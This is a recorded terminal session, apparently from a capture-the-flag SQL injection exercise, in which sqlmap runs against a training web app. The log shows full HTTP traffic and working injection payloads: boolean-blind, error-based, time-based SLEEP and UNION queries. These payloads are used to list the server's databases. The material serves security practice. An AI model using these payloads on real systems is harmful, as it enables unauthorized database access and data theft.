@@ -1,0 +1,1139 @@
+Script started on 2020-05-02 14:32:25+05:30 [TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="135" LINES="29"]
+[0;31m┌─[[0;39mprashanth[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Music/ctf/pesctf2/sql[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mman script[C[C[C[C[C[C[6Phtopsudo su [C[C[C[C[C[C[39@echo "938d0079fbc8d76c4ca7c7c64d5246b7" > hash[C[C[C[C[C[C[Csudo su [K[C[C[C[C[C[C[4Phtopman script[C[C[C[C[C[C[Kman script[C[C[C[C[C[C[6Phtopsudo su [C[C[C[C[C[C[39@echo "938d0079fbc8d76c4ca7c7c64d5246b7" > hash[C[C[C[C[C[C[Cls[Krm hash [C[C[C[C[C[C[1@cat[C[C[C[C[C[C[C[C[C[C[C[Cls[Kecho "938d0079fbc8d76c4ca7c7c64d5246b7" > hash [C[C[C[C[C[C[1@sqlmap -r login1 -p uid -D sqlitraining  --dump[C[C[C[C[C[C[C[1Pecho "938d0079fbc8d76c4ca7c7c64d5246b7" > hash[C[C[C[C[C[C[C[1@sqlmap -r login1 -p uid -D sqlitraining  --dump[C[C[C[C[C[C[C[1Pecho "938d0079fbc8d76c4ca7c7c64d5246b7" > hash[C[C[C[C[C[C[Cls[Kcat hash [C[C[C[C[C[C[1Prm[C[C[C[C[C[C[C[C[C[C[C[Cls[Kecho "938d0079fbc8d76c4ca7c7c64d5246b7" > hash [C[C[C[C[C[Csudo su [K[C[C[C[C[C[C[4Phtopman script[C[C[C[C[C[C[Ksqlmap -r search -p searchitem --dbs -v 6 --fresh-queries
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m,[01;49m]_____ ___ ___  [01;37m{[01;90m1.3.8#stable[01;37m}[01;33m
+|_ -| . [[01;41m'[01;49m]     | .'| . |
+|___|_  [[01;41m.[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:32:44 /2020-05-02/
+
+[[36m14:32:44[0m] [[32mINFO[0m] parsing HTTP request from '[37msearch[0m'
+[[36m14:32:44[0m] [[34mDEBUG[0m] not a valid WebScarab log data
+[[36m14:32:44[0m] [[34mDEBUG[0m] cleaning up configuration parameters
+[[36m14:32:44[0m] [[34mDEBUG[0m] setting the HTTP timeout
+[[36m14:32:44[0m] [[34mDEBUG[0m] setting the HTTP User-Agent header
+[[36m14:32:44[0m] [[34mDEBUG[0m] creating HTTP requests opener object
+[[36m14:32:44[0m] [[34mDEBUG[0m] provided parameter '[37msearchitem[0m' is not inside the Cookie
+[[36m14:32:44[0m] [[32mINFO[0m] resuming back-end DBMS '[37mmysql[0m' 
+[[36m14:32:44[0m] [[34mDEBUG[0m] resolving hostname '[37msqli-balancer-1499139529.us-east-1.elb.amazonaws.com[0m'
+[[36m14:32:45[0m] [[32mINFO[0m] testing connection to the target URL
+[[36m14:32:45[0m] [[35mTRAFFIC OUT[0m] HTTP request [[33m#1[0m]:
+POST /searchproducts.php HTTP/1.1
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
+DNT: 1
+Host: sqli-balancer-1499139529.us-east-1.elb.amazonaws.com
+Referer: http://sqli-balancer-1499139529.us-east-1.elb.amazonaws.com/searchproducts.php
+Cookie: PHPSESSID=09bb8597ed740345cdd3889c7e10721c
+Upgrade-Insecure-Requests: 1
+Content-type: application/x-www-form-urlencoded
+Content-length: 15
+Connection: close
+
+searchitem=asdf
+
+[[36m14:32:45[0m] [[34mDEBUG[0m] declared web page charset '[37mutf-8[0m'
+[[36m14:32:45[0m] [[45mTRAFFIC IN[0m] HTTP response [[33m#1[0m] (200 OK):
+Cache-Control: no-store, no-cache, must-revalidate
+Content-Encoding: gzip
+Content-Type: text/html; charset=UTF-8
+Date: Sat, 02 May 2020 21:03:04 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.38 (Debian)
+Vary: Accept-Encoding
+X-Powered-By: PHP/7.3.17
+Content-Length: 787
+Connection: Close
+URI: http://sqli-balancer-1499139529.us-east-1.elb.amazonaws.com:80/searchproducts.php
+
+<!-- Enable debug using ?debug=true" -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Search Products</title>
+
+    <link href="./css/htmlstyles.css" rel="stylesheet">
+	</head>
+
+  <body>
+  <div class="container-narrow">
+		
+		<div class="jumbotron">
+			<p class="lead" style="color:white">
+				Welcome rhombus!! Search for products here</a>
+			</p>
+        </div>
+		
+		<div class="response">
+		
+			<p style="color:white">
+			<table class="response">
+			<form method="POST" autocomplete="off">
+			
+			<tr>
+				<td>
+					Search for a product:  
+				</td>
+				<td>
+					<input type="text" id="searchitem" name="searchitem">\xa0\xa0
+				</td>
+				<td>
+					<input type="submit" value="Search!"/> 
+				</td>
+			</tr>
+	</table>
+				
+			</p>
+
+		</form>
+        </div>
+    
+        
+		<br />
+
+
+<div class="searchheader" style="color:white">
+	<p hidden> Welcome to ze hints. Challenge 3 and 4: Try to figure out the DB software being used. Find out how to get database details with that. Challenge 5: Every table has a database. Every database has columns. Think about what these might be!</p>
+<table>	
+    
+	<tr>
+    <td style="width:200px " >
+        <b>Product Name</b>
+    </td>
+    
+    <td style="width:200px " >
+        <b>Product Type</b>
+    </td>
+    
+    <td style="width:450px " >
+        <b>Description</b>
+    </td>
+    
+    <td style="width:110px " >
+        <b>Price (in USD)</b>
+    </td>
+ 
+</tr>
+
+</table>
+	</div>
+
+	  
+	  
+	  <div class="footer">
+	  <p><h4><a href="blindsqli.php?user=rhombus">Profile</a> | <a href="logout.php">Logout</a> | <a href="index.php">Home</a><h4></p>
+      </div>
+	  
+	  
+
+
+	</div> <!-- /container -->
+  
+</body>
+</html>
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: searchitem (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: searchitem=-6911' OR 8362=8362-- IKRA
+    Vector: OR [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: searchitem=asdf' AND EXTRACTVALUE(2004,CONCAT(0x5c,0x7162707a71,(SELECT (ELT(2004=2004,1))),0x7170767871))-- rqEV
+    Vector: AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: searchitem=asdf' AND (SELECT 4145 FROM (SELECT(SLEEP(5)))xewr)-- qhSg
+    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: searchitem=asdf' UNION ALL SELECT NULL,NULL,CONCAT(0x7162707a71,0x59787948506a76647247676d5575755370735a415564474c62566d68506642494e616a565077556e,0x7170767871),NULL,NULL-- EpeQ
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+[[36m14:32:45[0m][1m [[32;1mINFO[0m][1m the back-end DBMS is MySQL[0m
+web server operating system: Linux Debian
+web application technology: Apache 2.4.38, PHP 7.3.17
+back-end DBMS: MySQL >= 5.1
+[[36m14:32:45[0m] [[32mINFO[0m] fetching database names
+[[36m14:32:45[0m] [[36mPAYLOAD[0m] asdf' UNION ALL SELECT NULL,NULL,CONCAT(0x7162707a71,IFNULL(CAST(schema_name AS CHAR),0x20),0x7170767871),NULL,NULL FROM INFORMATION_SCHEMA.SCHEMATA-- gapC
+[[36m14:32:45[0m] [[35mTRAFFIC OUT[0m] HTTP request [[33m#2[0m]:
+POST /searchproducts.php HTTP/1.1
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
+DNT: 1
+Host: sqli-balancer-1499139529.us-east-1.elb.amazonaws.com
+Referer: http://sqli-balancer-1499139529.us-east-1.elb.amazonaws.com/searchproducts.php
+Cookie: PHPSESSID=09bb8597ed740345cdd3889c7e10721c
+Upgrade-Insecure-Requests: 1
+Content-type: application/x-www-form-urlencoded
+Content-length: 212
+Connection: close
+
+searchitem=asdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7162707a71%2CIFNULL%28CAST%28schema_name%20AS%20CHAR%29%2C0x20%29%2C0x7170767871%29%2CNULL%2CNULL%20FROM%20INFORMATION_SCHEMA.SCHEMATA--%20gapC
+
+[[36m14:32:46[0m] [[45mTRAFFIC IN[0m] HTTP redirect [[33m#2[0m] (302 Found):
+Content-length: 2432
+X-powered-by: PHP/7.3.17
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Server: Apache/2.4.38 (Debian)
+Connection: Close
+Location: login1.php?msg=1
+Pragma: no-cache
+Cache-control: no-store, no-cache, must-revalidate
+Date: Sat, 02 May 2020 21:03:04 GMT
+Content-type: text/html; charset=UTF-8
+
+<!-- Enable debug using ?debug=true" -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Search Products</title>
+
+    <link href="./css/htmlstyles.css" rel="stylesheet">
+	</head>
+
+  <body>
+  <div class="container-narrow">
+		
+		<div class="jumbotron">
+			<p class="lead" style="color:white">
+				Welcome !! Search for products here</a>
+			</p>
+        </div>
+		
+		<div class="response">
+		
+			<p style="color:white">
+			<table class="response">
+			<form method="POST" autocomplete="off">
+			
+			<tr>
+				<td>
+					Search for a product:  
+				</td>
+				<td>
+					<input type="text" id="searchitem" name="searchitem">\xa0\xa0
+				</td>
+				<td>
+					<input type="submit" value="Search!"/> 
+				</td>
+			</tr>
+	</table>
+				
+			</p>
+
+		</form>
+        </div>
+    
+        
+		<br />
+
+
+<div class="searchheader" style="color:white">
+	<p hidden> Welcome to ze hints. Challenge 3 and 4: Try to figure out the DB software being used. Find out how to get database details with that. Challenge 5: Every table has a database. Every database has columns. Think about what these might be!</p>
+<table>	
+    
+	<tr>
+    <td style="width:200px " >
+        <b>Product Name</b>
+    </td>
+    
+    <td style="width:200px " >
+        <b>Product Type</b>
+    </td>
+    
+    <td style="width:450px " >
+        <b>Description</b>
+    </td>
+    
+    <td style="width:110px " >
+        <b>Price (in USD)</b>
+    </td>
+ 
+</tr>
+
+<tr><td style="width:200px"></td><td style="width:200px">qbpzqmysqlqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqinformation_schemaqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqperformance_schemaqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqsysqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqsqlitrainingqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr></table>
+	</div>
+
+	  
+	  
+	  <div class="footer">
+	  <p><h4><a href="blindsqli.php?user=">Profile</a> | <a href="logout.php">Logout</a> | <a href="index.php">Home</a><h4></p>
+      </div>
+	  
+	  
+
+
+	</div> <!-- /container -->
+  
+</body>
+</html>
+[1msqlmap got a 302 redirect to 'http://sqli-balancer-1499139529.us-east-1.elb.amazonaws.com:80/login1.php?msg=1'. Do you want to follow? [Y/n] [0mn
+[[36m14:32:50[0m] [[34mDEBUG[0m] performed 1 queries in 4.82 seconds
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sqlitraining
+[*] sys
+
+[[36m14:32:50[0m] [[32mINFO[0m] fetched data logged to text files under '[37m/home/prashanth/.sqlmap/output/sqli-balancer-1499139529.us-east-1.elb.amazonaws.com[0m'
+[[36m14:32:50[0m][1m [[33;1mWARNING[0m][1m you haven't updated sqlmap for more than 273 days!!![0m
+
+[*] ending @ 14:32:50 /2020-05-02/
+
+[0;31m┌─[[0;39mprashanth[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Music/ctf/pesctf2/sql[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mexit
+exit
+
+Script done on 2020-05-02 14:32:59+05:30 [COMMAND_EXIT_CODE="0"]
+Script started on 2020-05-02 14:48:10+05:30 [TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="135" LINES="29"]
+[0;31m┌─[[0;39mprashanth[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Music/ctf/pesctf2/sql[0;31m]
+[0;31m└──╼ [0m[01;33m$[0mls -sh[Kbinwalk --dd='*.' chal3_tainted_love_chal3_embedded.wav [C[C[C[C[C[Cls[K -sh[Ksqlmap -r search -p searchitem --dbs -v 6 --fresh-queries
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m,[01;49m]_____ ___ ___  [01;37m{[01;90m1.3.8#stable[01;37m}[01;33m
+|_ -| . [[01;41m.[01;49m]     | .'| . |
+|___|_  [[01;41m'[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:48:27 /2020-05-02/
+
+[[36m14:48:27[0m] [[32mINFO[0m] parsing HTTP request from '[37msearch[0m'
+[[36m14:48:27[0m] [[34mDEBUG[0m] not a valid WebScarab log data
+[[36m14:48:27[0m] [[34mDEBUG[0m] cleaning up configuration parameters
+[[36m14:48:27[0m] [[34mDEBUG[0m] setting the HTTP timeout
+[[36m14:48:27[0m] [[34mDEBUG[0m] setting the HTTP User-Agent header
+[[36m14:48:27[0m] [[34mDEBUG[0m] creating HTTP requests opener object
+[[36m14:48:27[0m] [[34mDEBUG[0m] provided parameter '[37msearchitem[0m' is not inside the Cookie
+[[36m14:48:27[0m] [[32mINFO[0m] resuming back-end DBMS '[37mmysql[0m' 
+[[36m14:48:27[0m] [[34mDEBUG[0m] resolving hostname '[37msqli-balancer-1499139529.us-east-1.elb.amazonaws.com[0m'
+[[36m14:48:28[0m] [[32mINFO[0m] testing connection to the target URL
+[[36m14:48:28[0m] [[35mTRAFFIC OUT[0m] HTTP request [[33m#1[0m]:
+POST /searchproducts.php HTTP/1.1
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
+DNT: 1
+Host: sqli-balancer-1499139529.us-east-1.elb.amazonaws.com
+Referer: http://sqli-balancer-1499139529.us-east-1.elb.amazonaws.com/searchproducts.php
+Cookie: PHPSESSID=09bb8597ed740345cdd3889c7e10721c
+Upgrade-Insecure-Requests: 1
+Content-type: application/x-www-form-urlencoded
+Content-length: 15
+Connection: close
+
+searchitem=asdf
+
+[[36m14:48:28[0m] [[34mDEBUG[0m] declared web page charset '[37mutf-8[0m'
+[[36m14:48:28[0m] [[45mTRAFFIC IN[0m] HTTP response [[33m#1[0m] (200 OK):
+Cache-Control: no-store, no-cache, must-revalidate
+Content-Encoding: gzip
+Content-Type: text/html; charset=UTF-8
+Date: Sat, 02 May 2020 21:18:47 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.38 (Debian)
+Vary: Accept-Encoding
+X-Powered-By: PHP/7.3.17
+Content-Length: 787
+Connection: Close
+URI: http://sqli-balancer-1499139529.us-east-1.elb.amazonaws.com:80/searchproducts.php
+
+<!-- Enable debug using ?debug=true" -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Search Products</title>
+
+    <link href="./css/htmlstyles.css" rel="stylesheet">
+	</head>
+
+  <body>
+  <div class="container-narrow">
+		
+		<div class="jumbotron">
+			<p class="lead" style="color:white">
+				Welcome rhombus!! Search for products here</a>
+			</p>
+        </div>
+		
+		<div class="response">
+		
+			<p style="color:white">
+			<table class="response">
+			<form method="POST" autocomplete="off">
+			
+			<tr>
+				<td>
+					Search for a product:  
+				</td>
+				<td>
+					<input type="text" id="searchitem" name="searchitem">\xa0\xa0
+				</td>
+				<td>
+					<input type="submit" value="Search!"/> 
+				</td>
+			</tr>
+	</table>
+				
+			</p>
+
+		</form>
+        </div>
+    
+        
+		<br />
+
+
+<div class="searchheader" style="color:white">
+	<p hidden> Welcome to ze hints. Challenge 3 and 4: Try to figure out the DB software being used. Find out how to get database details with that. Challenge 5: Every table has a database. Every database has columns. Think about what these might be!</p>
+<table>	
+    
+	<tr>
+    <td style="width:200px " >
+        <b>Product Name</b>
+    </td>
+    
+    <td style="width:200px " >
+        <b>Product Type</b>
+    </td>
+    
+    <td style="width:450px " >
+        <b>Description</b>
+    </td>
+    
+    <td style="width:110px " >
+        <b>Price (in USD)</b>
+    </td>
+ 
+</tr>
+
+</table>
+	</div>
+
+	  
+	  
+	  <div class="footer">
+	  <p><h4><a href="blindsqli.php?user=rhombus">Profile</a> | <a href="logout.php">Logout</a> | <a href="index.php">Home</a><h4></p>
+      </div>
+	  
+	  
+
+
+	</div> <!-- /container -->
+  
+</body>
+</html>
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: searchitem (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: searchitem=-6911' OR 8362=8362-- IKRA
+    Vector: OR [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: searchitem=asdf' AND EXTRACTVALUE(2004,CONCAT(0x5c,0x7162707a71,(SELECT (ELT(2004=2004,1))),0x7170767871))-- rqEV
+    Vector: AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: searchitem=asdf' AND (SELECT 4145 FROM (SELECT(SLEEP(5)))xewr)-- qhSg
+    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: searchitem=asdf' UNION ALL SELECT NULL,NULL,CONCAT(0x7162707a71,0x59787948506a76647247676d5575755370735a415564474c62566d68506642494e616a565077556e,0x7170767871),NULL,NULL-- EpeQ
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL[GENERIC_SQL_COMMENT]
+---
+[[36m14:48:28[0m][1m [[32;1mINFO[0m][1m the back-end DBMS is MySQL[0m
+web server operating system: Linux Debian
+web application technology: Apache 2.4.38, PHP 7.3.17
+back-end DBMS: MySQL >= 5.1
+[[36m14:48:28[0m] [[32mINFO[0m] fetching database names
+[[36m14:48:28[0m] [[36mPAYLOAD[0m] asdf' UNION ALL SELECT NULL,NULL,CONCAT(0x7162707a71,IFNULL(CAST(schema_name AS CHAR),0x20),0x7170767871),NULL,NULL FROM INFORMATION_SCHEMA.SCHEMATA-- KyCI
+[[36m14:48:28[0m] [[35mTRAFFIC OUT[0m] HTTP request [[33m#2[0m]:
+POST /searchproducts.php HTTP/1.1
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
+DNT: 1
+Host: sqli-balancer-1499139529.us-east-1.elb.amazonaws.com
+Referer: http://sqli-balancer-1499139529.us-east-1.elb.amazonaws.com/searchproducts.php
+Cookie: PHPSESSID=09bb8597ed740345cdd3889c7e10721c
+Upgrade-Insecure-Requests: 1
+Content-type: application/x-www-form-urlencoded
+Content-length: 212
+Connection: close
+
+searchitem=asdf%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7162707a71%2CIFNULL%28CAST%28schema_name%20AS%20CHAR%29%2C0x20%29%2C0x7170767871%29%2CNULL%2CNULL%20FROM%20INFORMATION_SCHEMA.SCHEMATA--%20KyCI
+
+[[36m14:48:29[0m] [[45mTRAFFIC IN[0m] HTTP response [[33m#2[0m] (200 OK):
+Cache-Control: no-store, no-cache, must-revalidate
+Content-Encoding: gzip
+Content-Type: text/html; charset=UTF-8
+Date: Sat, 02 May 2020 21:18:48 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Server: Apache/2.4.38 (Debian)
+Vary: Accept-Encoding
+X-Powered-By: PHP/7.3.17
+Content-Length: 873
+Connection: Close
+URI: http://sqli-balancer-1499139529.us-east-1.elb.amazonaws.com:80/searchproducts.php
+
+<!-- Enable debug using ?debug=true" -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Search Products</title>
+
+    <link href="./css/htmlstyles.css" rel="stylesheet">
+	</head>
+
+  <body>
+  <div class="container-narrow">
+		
+		<div class="jumbotron">
+			<p class="lead" style="color:white">
+				Welcome admin!! Search for products here</a>
+			</p>
+        </div>
+		
+		<div class="response">
+		
+			<p style="color:white">
+			<table class="response">
+			<form method="POST" autocomplete="off">
+			
+			<tr>
+				<td>
+					Search for a product:  
+				</td>
+				<td>
+					<input type="text" id="searchitem" name="searchitem">\xa0\xa0
+				</td>
+				<td>
+					<input type="submit" value="Search!"/> 
+				</td>
+			</tr>
+	</table>
+				
+			</p>
+
+		</form>
+        </div>
+    
+        
+		<br />
+
+
+<div class="searchheader" style="color:white">
+	<p hidden> Welcome to ze hints. Challenge 3 and 4: Try to figure out the DB software being used. Find out how to get database details with that. Challenge 5: Every table has a database. Every database has columns. Think about what these might be!</p>
+<table>	
+    
+	<tr>
+    <td style="width:200px " >
+        <b>Product Name</b>
+    </td>
+    
+    <td style="width:200px " >
+        <b>Product Type</b>
+    </td>
+    
+    <td style="width:450px " >
+        <b>Description</b>
+    </td>
+    
+    <td style="width:110px " >
+        <b>Price (in USD)</b>
+    </td>
+ 
+</tr>
+
+<tr><td style="width:200px"></td><td style="width:200px">qbpzqmysqlqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqinformation_schemaqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqperformance_schemaqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqsysqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr><tr><td style="width:200px"></td><td style="width:200px">qbpzqsqlitrainingqpvxq</td><td style="width:450px"></td><td style="width:110px"></td></tr></table>
+	</div>
+
+	  
+	  
+	  <div class="footer">
+	  <p><h4><a href="blindsqli.php?user=admin">Profile</a> | <a href="logout.php">Logout</a> | <a href="index.php">Home</a><h4></p>
+      </div>
+	  
+	  
+
+
+	</div> <!-- /container -->
+  
+</body>
+</html>
+[[36m14:48:29[0m] [[34mDEBUG[0m] performed 1 queries in 0.37 seconds
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sqlitraining
+[*] sys
+
+[[36m14:48:29[0m] [[32mINFO[0m] fetched data logged to text files under '[37m/home/prashanth/.sqlmap/output/sqli-balancer-1499139529.us-east-1.elb.amazonaws.com[0m'
+[[36m14:48:29[0m][1m [[33;1mWARNING[0m][1m you haven't updated sqlmap for more than 273 days!!![0m
+
+[*] ending @ 14:48:29 /2020-05-02/
+
+[0;31m┌─[[0;39mprashanth[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Music/ctf/pesctf2/sql[0;31m]
+[0;31m└──╼ [0m[01;33m$[0msqlmap -r search -p searchitem --dbs -v 6 --fresh-queries
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m'[01;49m]_____ ___ ___  [01;37m{[01;90m1.3.8#stable[01;37m}[01;33m
+|_ -| . [[01;41m,[01;49m]     | .'| . |
+|___|_  [[01;41m'[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:48:33 /2020-05-02/
+
+[[36m14:48:33[0m] [[32mINFO[0m] parsing HTTP request from '[37msearch[0m'
+[[36m14:48:33[0m] [[34mDEBUG[0m] not a valid WebScarab log data
+[[36m14:48:33[0m] [[34mDEBUG[0m] cleaning up configuration parameters
+[[36m14:48:33[0m] [[34mDEBUG[0m] setting the HTTP timeout
+[[36m14:48:33[0m] [[34mDEBUG[0m] setting the HTTP User-Agent header
+[[36m14:48:33[0m] [[34mDEBUG[0m] creating HTTP requests opener object
+[[36m14:48:33[0m] [[34mDEBUG[0m] provided parameter '[37msearchitem[0m' is not inside the Cookie
+[[36m14:48:33[0m] [[32mINFO[0m] resuming back-end DBMS '[37mmysql[0m' 
+[[36m14:48:33[0m] [[34mDEBUG[0m] resolving hostname '[37msqli-balancer-1499139529.us-east-1.elb.amazonaws.com[0m'
+[[36m14:48:33[0m] [[32mINFO[0m] testing connection to the target URL
+[[36m14:48:33[0m] [[35mTRAFFIC OUT[0m] HTTP request [[33m#1[0m]:
+POST /searchproducts.php HTTP/1.1
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
+DNT: 1
+Host: sqli-balancer-1499139529.us-east-1.elb.amazonaws.com
+Referer: http://sqli-balancer-1499139529.us-east-1.elb.amazonaws.com/searchproducts.php
+Cookie: PHPSESSID=09bb8597ed740345cdd3889c7e10721c
+Upgrade-Insecure-Requests: 1
+Content-type: application/x-www-form-urlencoded
+Content-length: 15
+Connection: close
+
+searchitem=asdf
+
+^C
+[[36m14:48:33[0m][1m [[33;1mWARNING[0m][1m you haven't updated sqlmap for more than 273 days!!![0m
+
+[*] ending @ 14:48:33 /2020-05-02/
+
+[0;31m┌─[[0;39mprashanth[01;33m@[01;96mparrot[0;31m]─[[0;32m~/Music/ctf/pesctf2/sql[0;31m]
+[0;31m└──╼ [0m[01;33m$[0msqlmap -r search -p searchitem --dbs -v 6 --fresh-queries [C[1P[1P[1P[1P[1@D[C[1@ [1@m[1@y[1@s[1@e[1P[1@q[1@l
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m.[01;49m]_____ ___ ___  [01;37m{[01;90m1.3.8#stable[01;37m}[01;33m
+|_ -| . [[01;41m([01;49m]     | .'| . |
+|___|_  [[01;41m)[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:48:52 /2020-05-02/
+
+[[36m14:48:52[0m] [[32mINFO[0m] parsing HTTP request from '[37msearch[0m'
+[[36m14:48:52[0m] [[34mDEBUG[0m] not a valid WebScarab log data
+[[36m14:48:52[0m] [[34mDEBUG[0m] cleaning up configuration parameters
+[[36m14:48:52[0m] [[34mDEBUG[0m] setting the HTTP timeout
+[[36m14:48:52[0m] [[34mDEBUG[0m] setting the HTTP User-Agent header
+[[36m14:48:52[0m] [[34mDEBUG[0m] creating HTTP requests opener object
+[[36m14:48:53[0m] [[34mDEBUG[0m] provided parameter '[37msearchitem[0m' is not inside the Cookie
+[[36m14:48:53[0m] [[32mINFO[0m] resuming back-end DBMS '[37mmysql[0m' 
+[[36m14:48:53[0m] [[34mDEBUG[0m] resolving hostname '[37msqli-balancer-1499139529.us-east-1.elb.amazonaws.com[0m'
+[[36m14:48:53[0m] [[32mINFO[0m] testing connection to the target URL
+[[36m14:48:53[0m] [[35mTRAFFIC OUT[0m] HTTP request [[33m#1[0m]:
+POST /searchproducts.php HTTP/1.1
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
+DNT: 1
+Host: sqli-balancer-1499139529.us-east-1.elb.amazonaws.com
+Referer: http://sqli-balancer-1499139529.us-east-1.elb.amazonaws.com/searchproducts.php
+Cookie: PHPSESSID=09bb8597ed740345cdd3889c7e10721c
+Upgrade-Insecure-Requests: 1
+Content-type: application/x-www-form-urlencoded
+Content-length: 15
+Connection: close
+
+searchitem=asdf
+
